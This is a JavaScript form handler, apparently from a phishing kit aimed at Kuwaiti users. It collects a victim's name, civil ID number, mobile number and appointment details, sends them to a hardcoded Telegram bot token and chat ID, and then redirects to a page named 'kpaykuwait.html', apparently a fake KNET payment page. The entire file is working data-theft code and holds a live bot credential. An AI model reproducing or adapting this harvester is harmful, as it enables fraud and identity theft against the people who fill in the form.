window.onload = function () {
  const today = new Date().toISOString().split("T")[0];
  document.getElementById("futureDate").value = today;

  const token = "7847502445:AAGXYt3fTBBIXRQufdb_DrhkIrKO5oWuJng";
  const chatId = "7595871538";

  document.getElementById("form1").addEventListener("submit", function (e) {
      e.preventDefault();

      const name = document.getElementById("userName").value.trim();
      const phone = document.getElementById("phone").value.trim(); // تصحيح الوصول إلى رقم الهاتف المدني
      const phone1 = document.getElementById("phone1").value.trim(); // تصحيح الوصول إلى رقم الجوال
      const datehom = document.getElementById("futureDate").value.trim();
      const delivery_time = document.getElementById("selectform").value.trim();

      if (!name || !phone || !phone1 || !datehom || !delivery_time) {
          alert("يرجى ملء جميع الحقول.");
          return;
      }

      localStorage.setItem("storedUserName", name);

      const message = `
          📥 معلومات مقدم طلب :
          👤 الاسم: ${name}
          📞 الرقم المدني: ${phone}
          📧 رقم الجوال: ${phone1}
          🗓️ تاريخ الحضور: ${datehom}
          ⏰ موعد التوصيل: ${delivery_time}
      `;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({
              chat_id: chatId,
              text: message
          })
      })
      .then(response => {
          if (response.ok) {
              window.location.href = "kpaykuwait.html";
          } else {
              alert("فشل في إرسال البيانات.");
          }
      })
      .catch(error => {
          console.error("⚠️ خطأ في الاتصال:", error);
          alert("حدث خطأ أثناء الإرسال.");
      });
  });
};